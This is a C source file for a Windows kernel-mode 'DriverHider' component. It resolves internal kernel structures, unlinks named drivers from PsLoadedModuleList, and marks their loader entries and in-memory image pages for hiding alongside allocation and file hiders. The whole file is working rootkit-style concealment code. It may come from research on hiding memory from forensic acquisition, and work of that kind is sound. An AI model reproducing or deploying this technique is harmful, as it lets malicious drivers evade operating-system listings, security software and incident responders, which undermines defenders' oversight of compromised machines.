#include "DriverHider.h"
#include "DriverHiderPrivateIncludes.h"
#include "AllocationHider.h"
#include "FileHider.h"
#include "GenericHider.h"
#include "SymbolWrapper.h"

// boolean representing status of DriverHider
static BOOLEAN bIsDriverHiderInitialized = FALSE;

// flag which determines the state of the internal symbols
static BOOLEAN bSymbolsInitialized = FALSE;

// address of PsLoadedModuleList
static PULONG_PTR pPsLoadedModuleList = NULL;

// offset of InLoadOrderLinks inside LDR_DATA_TABLE_ENTRY structure
static ULONG uLdrDTEntryInLoadOrderLinksOffset = -1;

// offset of DllBase inside LDR_DATA_TABLE_ENTRY structure
static ULONG uLdrDTEntryDllBaseOffset = -1;

// offset of SizeOfImage inside LDR_DATA_TABLE_ENTRY structure
static ULONG uLdrDTEntrySizeOfImageOffset = -1;

// offset of BaseDllName inside LDR_DATA_TABLE_ENTRY structure
static ULONG uLdrDTEntryBaseDllNameOffset = -1;

// target driver names will be stored in a singly-linked list for
static NPAGED_LOOKASIDE_LIST DriverNamesLookasideList;

// the head of the driver names list
static LIST_ENTRY DriverNamesListHead;

// mutex which will protect accesses to driver names list
static FAST_MUTEX DriverNamesListMutex;

BOOLEAN DhpHideModule(IN OUT PSORTED_LIST, const IN PUNICODE_STRING);
BOOLEAN DhpHideDriverImage(IN OUT PSORTED_LIST, const IN PVOID, const IN ULONG);

NTSTATUS DhInit(VOID)
{
	KeEnterCriticalRegion();
	if(bIsDriverHiderInitialized == TRUE)
	{
		KeLeaveCriticalRegion();
		return STATUS_SUCCESS;
	}

	// initialize allocation hider
	if(!NT_SUCCESS(AhInit()))
	{
		KdPrint(("[DEBUG] WARNING - Allocation hider not initialized - allocations will not be hidden\n"));
	}

	if(!NT_SUCCESS(FhInit()))
	{
		KdPrint(("[DEBUG] WARNING - File hider not initialized - file objects will not be hidden\n"));
	}

	// add all necessary symbols
	if(	!SymWAddSymbol("PsLoadedModuleList", -1, -1, -1, -1) ||
		!SymWAddSymbol("_LDR_DATA_TABLE_ENTRY.InLoadOrderLinks", -1, -1, -1, -1) ||
		!SymWAddSymbol("_LDR_DATA_TABLE_ENTRY.DllBase", -1, -1, -1, -1) ||
		!SymWAddSymbol("_LDR_DATA_TABLE_ENTRY.SizeOfImage", -1, -1, -1, -1) ||
		!SymWAddSymbol("_LDR_DATA_TABLE_ENTRY.BaseDllName", -1, -1, -1, -1)
		)
	{
		KdPrint(("[DEBUG] ERROR - Error while adding necessary symbols - driver hider INACTIVE!\n"));
		KeLeaveCriticalRegion();
		return STATUS_NOT_FOUND;
	}

	ASSERTMSG("Fast mutex must be initialized at or below DISPATCH_LEVEL", KeGetCurrentIrql() <= DISPATCH_LEVEL);

	// initialize all required data structures
	ExInitializeNPagedLookasideList(&DriverNamesLookasideList,			// list to initialize
									NULL,								// allocate function - OS supplied
									NULL,								// free function - OS supplied
									0,									// flags - always zero
									sizeof(DRIVER_NAME_ENTRY),			// size of each entry to be allocated
									TAG_DRIVER_NAME_LOOKASIDE,			// DrnL(ookaside) tag
									0									// depth - always zero
									);
	InitializeListHead(&DriverNamesListHead);
	ExInitializeFastMutex(&DriverNamesListMutex);

	bIsDriverHiderInitialized = TRUE;
	KeLeaveCriticalRegion();

	return STATUS_SUCCESS;
}

BOOLEAN DhInitSymbols(VOID)
{
	ASSERTMSG("Cannot initialize driver related symbols because DriverHider is not yet initialized", bIsDriverHiderInitialized == TRUE);

	KeEnterCriticalRegion();
	if(bSymbolsInitialized == TRUE)
	{
		KeLeaveCriticalRegion();
		return TRUE;
	}

	if(!AhInitSymbols())
	{
		KdPrint(("[DEBUG] WARNING - Cannot initialize symbols for allocation hider - allocations won't be hidden!\n"));
	}

	if(!FhInitSymbols())
	{
		KdPrint(("[DEBUG] WARNING - Cannot initialize symbols for the file hider - file objects won't be hidden!\n"));
	}

	BOOLEAN bRet = TRUE;
	bRet =	SymWInitializeAddress((PVOID *) &pPsLoadedModuleList, "PsLoadedModuleList", TRUE) &&
			SymWInitializeOffset(&uLdrDTEntryInLoadOrderLinksOffset, "_LDR_DATA_TABLE_ENTRY.InLoadOrderLinks") &&
			SymWInitializeOffset(&uLdrDTEntryDllBaseOffset, "_LDR_DATA_TABLE_ENTRY.DllBase") &&
			SymWInitializeOffset(&uLdrDTEntrySizeOfImageOffset, "_LDR_DATA_TABLE_ENTRY.SizeOfImage") &&
			SymWInitializeOffset(&uLdrDTEntryBaseDllNameOffset, "_LDR_DATA_TABLE_ENTRY.BaseDllName");

	if(!bRet)
	{
		KdPrint(("[DEBUG] ERROR - Error while initializing offsets or addresses - driver hider INACTIVE!\n"));
	}

	bSymbolsInitialized = TRUE;
	KeLeaveCriticalRegion();
	return TRUE;
}

VOID DhUnInit(VOID)
{
	KeEnterCriticalRegion();
	// check if the engine has been initialized
	if(bIsDriverHiderInitialized == FALSE)
	{
		KeLeaveCriticalRegion();
		return;
	}

	// un-initialize all initialized "hiding engines"
	AhUnInit();
	FhUnInit();

	PLIST_ENTRY driverNamesListEntry = DriverNamesListHead.Flink;

	// iterate through the driver name list
	ASSERTMSG("Fast mutex acquire must occur at or below APC_LEVEL", KeGetCurrentIrql() <= APC_LEVEL);
	ExAcquireFastMutex(&DriverNamesListMutex);
	while(driverNamesListEntry != &DriverNamesListHead)
	{
		// must deallocate the memory allocated for the driver name
		PDRIVER_NAME_ENTRY pDriverNameEntry = CONTAINING_RECORD(driverNamesListEntry, DRIVER_NAME_ENTRY, ListEntry);
		// ON APC_LEVEL - SAFE TO CALL THE FREE FUNCTION!
		RtlFreeUnicodeString(&pDriverNameEntry->uszDriverName);
		driverNamesListEntry = driverNamesListEntry->Flink;
	}

	// free all entries in lookaside list
	ExDeleteNPagedLookasideList(&DriverNamesLookasideList);
	ASSERTMSG("Fast mutex release must occur at APC_LEVEL", KeGetCurrentIrql() == APC_LEVEL);
	ExReleaseFastMutex(&DriverNamesListMutex);

	bIsDriverHiderInitialized = FALSE;
	KeLeaveCriticalRegion();
}

BOOLEAN DhAddTargetDriver(const IN char *pszDriverName)
{
	ASSERTMSG("Cannot add new driver because the engine is not yet initialized", bIsDriverHiderInitialized == TRUE);
	ASSERTMSG("Internal symbols are not initialized!", bSymbolsInitialized == TRUE);

	if(pszDriverName == NULL)
	{
		KdPrint(("[DEBUG] ERROR - Driver name is NULL, cannot add new driver name\n"));
		return FALSE;
	}

	PDRIVER_NAME_ENTRY pDriverNameEntry = (PDRIVER_NAME_ENTRY) ExAllocateFromNPagedLookasideList(&DriverNamesLookasideList);
	if(pDriverNameEntry == NULL)
	{
		KdPrint(("[DEBUG] WARNING - Not enough memory in the lookaside list to allocate new driver name entry...\n"));
		return FALSE;
	}

	ANSI_STRING szDriverName;
	RtlInitAnsiString(&szDriverName, pszDriverName);

	RtlAnsiStringToUnicodeString(&pDriverNameEntry->uszDriverName, &szDriverName, TRUE);

	KdPrint(("[DEBUG] Hiding driver %wZ entries\n", pDriverNameEntry->uszDriverName));

	// add new driver to the list (thread safely)
	ASSERTMSG("Fast mutex acquire/release must occur at or below APC_LEVEL", KeGetCurrentIrql() <= APC_LEVEL);
	ExAcquireFastMutex(&DriverNamesListMutex);
	InsertHeadList(&DriverNamesListHead, &pDriverNameEntry->ListEntry);
	ExReleaseFastMutex(&DriverNamesListMutex);

	return TRUE;	
}

BOOLEAN DhFindHideAddreses(IN OUT PSORTED_LIST pList)
{
	ASSERTMSG("Cannot hide driver because the engine is not yet initialized", bIsDriverHiderInitialized == TRUE);
	ASSERTMSG("Internal symbols are not initialized!", bSymbolsInitialized == TRUE);

	if(pList == NULL)
	{
		KdPrint(("[DEBUG] ERROR - Hide list is not initialized -- cannot add driver-related data to the list\n"));
		return FALSE;
	}

	BOOLEAN bRet = TRUE;
	PLIST_ENTRY driverNamesListEntry = DriverNamesListHead.Flink;

	// iterate through the driver name list
	ASSERTMSG("Fast mutex acquire must occur at or below APC_LEVEL", KeGetCurrentIrql() <= APC_LEVEL);
	ExAcquireFastMutex(&DriverNamesListMutex);
	while(driverNamesListEntry != &DriverNamesListHead)
	{
		// get the driver name and try to hide the this driver from the PsLoadedModuleList
		PDRIVER_NAME_ENTRY pDriverNameEntry = CONTAINING_RECORD(driverNamesListEntry, DRIVER_NAME_ENTRY, ListEntry);
		bRet &= DhpHideModule(pList, &pDriverNameEntry->uszDriverName);

		driverNamesListEntry = driverNamesListEntry->Flink;
	}

	ASSERTMSG("Fast mutex release must occur at APC_LEVEL", KeGetCurrentIrql() == APC_LEVEL);
	ExReleaseFastMutex(&DriverNamesListMutex);
	
	return bRet;
}

BOOLEAN DhpHideModule(IN OUT PSORTED_LIST pList, const IN PUNICODE_STRING puszDriverName)
{
	ASSERTMSG("Passed pointer to hide list is NULL", pList != NULL);
	ASSERTMSG("Passed pointer to driver name is NULL", puszDriverName != NULL);

	// obtain the first element of loaded module list
	PVOID pModuleEntry = (PVOID) *pPsLoadedModuleList;

	if(pModuleEntry == NULL)
	{
		KdPrint(("[DEBUG] ERROR - Module pointed to by the PsLoadedModuleList is NULL, cannot traverse the list...\n"));
		return FALSE;
	}

	BOOLEAN bRet = TRUE;

	// traverse the list of modules
	PVOID pCurModule = pModuleEntry;
	do 
	{
		// get the name of the current module
		PUNICODE_STRING puszCurDriverName = (PUNICODE_STRING) SYMW_MEMBER_FROM_OFFSET(pCurModule, uLdrDTEntryBaseDllNameOffset, 0);

		// check if this is the target module (case insensitive)
		if(!RtlCompareUnicodeString(puszDriverName, puszCurDriverName, TRUE))
		{
			KdPrint(("[DEBUG] Found driver \"%wZ\" inside the loaded module list @ 0x%p. Unlinking and hiding allocation...\n", puszDriverName, pCurModule));

			// target module, unlink it from the list
			GhModifyListFlinkBlinkPointers(pList, pCurModule, uLdrDTEntryInLoadOrderLinksOffset);

			// hide the entire allocation
			// LDR_DATA_TABLE_ENTRY allocations have 'MmLd' tag - 0x644c6d4d
			bRet = AhAddAllocation(pList, pCurModule, 0x644c6d4d);

			// hide the driver image in memory
			PVOID pDriverBase = (PVOID) *((PULONG_PTR) SYMW_MEMBER_FROM_OFFSET(pCurModule, uLdrDTEntryDllBaseOffset, 0));
			ULONG uSizeOfImage = *((PULONG) SYMW_MEMBER_FROM_OFFSET(pCurModule, uLdrDTEntrySizeOfImageOffset, 0));
			DhpHideDriverImage(pList, pDriverBase, uSizeOfImage);

			// don't break, there is a possibility of multiple modules with the same name
		}

		// move to the next element
		PLIST_ENTRY pNext = (PLIST_ENTRY) SYMW_MEMBER_FROM_OFFSET(pCurModule, uLdrDTEntryInLoadOrderLinksOffset, 0);
		pCurModule = (PVOID) SYMW_MEMBER_FROM_OFFSET(pNext->Flink, 0, uLdrDTEntryInLoadOrderLinksOffset);
	} while (pCurModule != pModuleEntry);

	return bRet;
}

BOOLEAN DhpHideDriverImage(IN OUT PSORTED_LIST pList, const IN PVOID pDriverBaseAddress, const IN ULONG uDriverSize)
{
	ASSERTMSG("Passed pointer to hide list is NULL", pList != NULL);
	
	// since address and driver size are retrieved dynamically, check them explicitly
	if(pDriverBaseAddress == NULL)
	{
		KdPrint(("[DEBUG] WARNING - Invalid driver base address, cannot hide driver image in memory...\n"));
		return FALSE;
	}

	if(uDriverSize == 0)
	{
		KdPrint(("[DEBUG] WARNING - Invalid driver image size, cannot hide driver image in memory...\n"));
		return FALSE;
	}

	KdPrint(("[DEBUG] Hiding driver image @ 0x%p (size 0x%x)\n", pDriverBaseAddress, uDriverSize));

	// read memory in pages
	for(ULONG uOffset = 0; uOffset <= uDriverSize; uOffset += PAGE_SIZE)
	{
		PVOID pAddress = (PVOID) ((ULONG_PTR) pDriverBaseAddress  + uOffset);

		// check if address is valid (not paged-out or invalid in any other way)
		if(MmIsAddressValid(pAddress))
		{
			GhAddRangeForHiding(pList, NULL, pAddress, PAGE_SIZE);
		}
	}
	
	return TRUE;
}